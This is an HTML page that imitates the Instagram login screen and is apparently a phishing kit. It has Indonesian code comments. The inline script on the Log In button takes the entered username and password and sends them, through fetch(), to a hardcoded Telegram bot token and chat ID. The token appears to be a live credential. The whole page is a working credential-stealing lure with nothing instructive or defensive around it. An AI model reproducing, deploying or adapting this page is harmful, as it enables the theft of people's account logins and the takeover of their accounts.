<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
	<link rel="icon" href="321.ico" type="image/x-icon">
    <link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="wrapper">
    <div class="header">
        <div class="top">
            <div class="logo">
                <img src="instagram.png" alt="instagram" style="width: 175px;">
            </div>
            <div class="form">
                <div class="input_field">
                    <input type="text" id="username" placeholder="Phone number, username, or email" class="input">
                </div>
                <div class="input_field">
                    <input type="password" id="password" placeholder="Password" class="input">
                </div>
                <div class="btn" id="sendToTelegram"><a href="#">Log In</a></div>
            </div>
            <div class="or">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
            </div>
            <div class="dif">
                <div class="fb">
                    <img src="facebook.png" alt="facebook">
                    <p>Log in with Facebook</p>
                </div>
                <div class="forgot">
                    <a href="#">Forgot password?</a>
                </div>
            </div>
        </div>
        <div class="signup">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        <div class="apps">
            <p>Get the app.</p>
            <div class="icons">
                <a href="#"><img src="appstore.png" alt="appstore"></a>
                <a href="#"><img src="googleplay.png" alt="googleplay"></a>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="links">
            <ul>
                <li><a href="#">ABOUT US</a></li>
                <li><a href="#">SUPPORT</a></li>
                <li><a href="#">PRESS</a></li>
                <li><a href="#">API</a></li>
                <li><a href="#">JOBS</a></li>
                <li><a href="#">PRIVACY</a></li>
                <li><a href="#">TERMS</a></li>
                <li><a href="#">DIRECTORY</a></li>
                <li><a href="#">PROFILES</a></li>
                <li><a href="#">HASHTAGS</a></li>
                <li><a href="#">LANGUAGE</a></li>
            </ul>
        </div>
        <div class="copyright">
            Â© 2019 INSTAGRAM
        </div>
    </div>
</div>

<script>
document.getElementById('sendToTelegram').addEventListener('click', function(event) {
    event.preventDefault(); // Mencegah reload halaman

    // Ambil nilai dari input
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;

    // Cek apakah input tidak kosong
    if (!username || !password) {
        alert('Silakan isi username dan password!');
        return;
    }

    // Data bot Telegram
    var botToken = '8053803178:AAHnlfGLjgotTDU0YPrEImFJ-9DB7J1T11s'; // Ganti dengan Token Bot Anda
    var chatId = '6820629880'; // Ganti dengan chat ID Anda

    // Pesan yang akan dikirim
    var message = 'Login Details:\nUsername: ' + username + '\nPassword: ' + password;

    // URL API Telegram
    var telegramUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);

    // Mengirim pesan ke Telegram menggunakan fetch API
    fetch(telegramUrl)
        .then(response => response.json())
        .then(data => {
            if(data.ok) {
            } else {
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Terjadi kesalahan saat mengirim pesan.');
        });
});
</script>

</body>
</html>
